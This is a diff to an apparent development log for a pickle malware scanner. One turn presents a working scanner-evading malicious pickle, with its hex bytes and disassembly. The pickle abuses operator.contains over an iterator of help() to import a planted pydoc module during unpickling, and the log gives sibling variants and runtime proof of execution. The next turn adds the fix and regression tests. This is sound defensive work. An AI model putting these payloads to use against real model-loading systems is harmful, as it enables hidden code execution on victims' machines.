@@ -17534,3 +17534,228 @@ format applied to 1 test file; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3814 passed, 1022 skipped, 21 warnings in 44.26s
 ```
+
+## Turn 267 - Bypass via operator sequence search helpers
+
+Offensive turn after the Turn 266 defense. The next source-level gap is not a
+container constructor or descriptor; it is `operator` helper functions that
+delegate to CPython sequence search/contains semantics and consume iterators.
+
+Smallest representative:
+
+```python
+operator.contains(iter(builtins.help, "stop"), "never")
+```
+
+`operator.contains(seq, value)` maps to the `value in seq` protocol. When `seq`
+is a call iterator, CPython repeatedly advances it while searching. That invokes
+`builtins.help()`, which reaches `_sitebuiltins._Helper.__call__` and imports
+`pydoc`; a shadow `pydoc.py` on `sys.path` executes during `pickle.loads`.
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c086f70657261746f728c08636f6e7461696e73932868008c056e6576657274522e
+```
+
+Payload shape:
+
+```text
+00: PROTO 4
+18: STACK_GLOBAL builtins.iter
+35: STACK_GLOBAL builtins.help
+42: TUPLE2
+43: REDUCE              # iter(help, "stop")
+44: MEMOIZE
+45: POP
+66: STACK_GLOBAL operator.contains
+68: BINGET 0            # call iterator
+70: SHORT_BINUNICODE 'never'
+77: TUPLE
+78: REDUCE              # operator.contains(call_iterator, 'never'), drains input
+79: STOP
+```
+
+Scanner proof:
+
+```text
+primary_len 80
+primary_scan clean findings 0 errors ()
+primary_imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('operator', 'contains', 66),
+]
+primary_invocations [
+  ('builtins', 'iter', 2, 18, 43),
+  ('operator', 'contains', 2, 66, 78),
+]
+```
+
+Runtime proof:
+
+```text
+primary_runtime_rc 0
+runtime_type bool
+runtime_repr False
+marker_exists True
+marker_text owned-by-operator-contains
+primary_runtime_stderr
+```
+
+Sibling probes:
+
+```text
+operator.countOf len 79 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('operator', 'countOf', 2, 77),
+  ]
+  runtime_stdout 0 | True
+
+operator.indexOf len 85 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('operator', 'indexOf', 2, 83),
+  ]
+  runtime_stdout 0 | True
+
+operator.indexOf_missing len 79 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('operator', 'indexOf', 2, 77),
+  ]
+  runtime_stdout ValueError | True
+
+operator.length_hint len 75 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('operator', 'length_hint', 1, 73),
+  ]
+  runtime_stdout 0 | False
+```
+
+Why it bypasses:
+
+- The scanner models `iter(help, "stop")` as `StackValue::CallIterator`.
+- Existing defenses model direct iterator consumers, lazy wrappers,
+  constructor/materializer consumers, descriptor mutators, and selected
+  protocol dispatches.
+- `operator.contains`, `operator.countOf`, and `operator.indexOf` are ordinary
+  reducer callables in metadata; they are not in the call-iterator consumption
+  tables.
+- Runtime source semantics drain the iterable through CPython sequence search,
+  so the hidden `help()` invocation occurs before the reducer returns.
+
+Likely source-level defense:
+
+- Add an `operator` protocol-consumer table keyed by exact function name and
+  iterable argument slot:
+  `contains`, `countOf`, and `indexOf` consume argument 0.
+- Keep `operator.length_hint` as a negative regression; it inspects the length
+  hint without advancing the iterator and did not execute the marker.
+- The rule remains reducer-local and O(1) for exact-name dispatch.
+
+Performance note:
+
+- The representative payload is 80 bytes.
+- Warm scan median over 1000 runs was `0.000055s`, p95 `0.000059s`, and max
+  `0.000332s`.
+
+## Turn 268 - Block operator sequence search consumers
+
+Defensive turn for the Turn 267 bypass. The fix stays at the call-graph source:
+when a reducer calls `operator.contains`, `operator.countOf`, or
+`operator.indexOf` with a call iterator as argument 0, model the iterator's
+zero-argument callable as invoked. This covers both `operator` and `_operator`
+without adding package-specific rules.
+
+Focused change:
+
+```text
+operator.contains(call_iterator, value) -> consumes argument 0
+operator.countOf(call_iterator, value) -> consumes argument 0
+operator.indexOf(call_iterator, value) -> consumes argument 0
+```
+
+Negative boundary:
+
+```text
+operator.length_hint(call_iterator) -> does not advance the iterator
+```
+
+Post-fix proof for the Turn 267 representative payload:
+
+```text
+payload_len 80
+scan malicious findings 1 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('operator', 'contains', 66),
+]
+invocations [
+  ('builtins', 'iter', 2, 18, 43),
+  ('operator', 'contains', 2, 66, 78),
+  ('builtins', 'help', 0, 35, 78),
+]
+finding DANGEROUS_CALL_GRAPH {
+  'module': '_sitebuiltins',
+  'name': '_Helper.__call__',
+  'sink': 'builtins.__import__',
+  'call_path': ('_sitebuiltins._Helper.__call__', 'builtins.__import__'),
+}
+is_malicious True
+runtime rc 0
+runtime_type bool
+runtime_repr False
+marker_exists True
+marker_text owned-by-operator-contains
+runtime stderr
+```
+
+Regression coverage:
+
+- `operator.contains(iter(help, "stop"), "never")` is now malicious and
+  runtime-proven to execute the marker.
+- `operator.countOf(iter(help, "stop"), "never")` is now malicious and
+  runtime-proven to execute the marker.
+- `operator.indexOf(iter(help, "stop"), "owned-value")` is now malicious and
+  runtime-proven to execute the marker.
+- `operator.length_hint(iter(help, "stop"))` remains clean and runtime-proven
+  not to execute the marker.
+
+Simplification note:
+
+- This removes the need to chase individual libraries that wrap sequence search
+  behavior. The scanner now models the finite source primitive:
+  `operator`/`_operator` sequence-search helpers consuming argument 0.
+- The helper is exact-name, exact-arity, and reducer-local, so the hot path is a
+  pair of string matches plus one argument lookup.
+
+Performance note:
+
+- Warm post-fix scan timing over 1000 runs: median `0.000121s`, p95
+  `0.000130s`, max `0.000143s`.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+pytest targeted operator sequence-search regressions
+4 passed in 0.45s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+103 passed in 2.91s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+141 passed in 4.76s
+
+ruff format/check, mypy
+format unchanged; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3818 passed, 1022 skipped, 21 warnings in 42.35s
+```
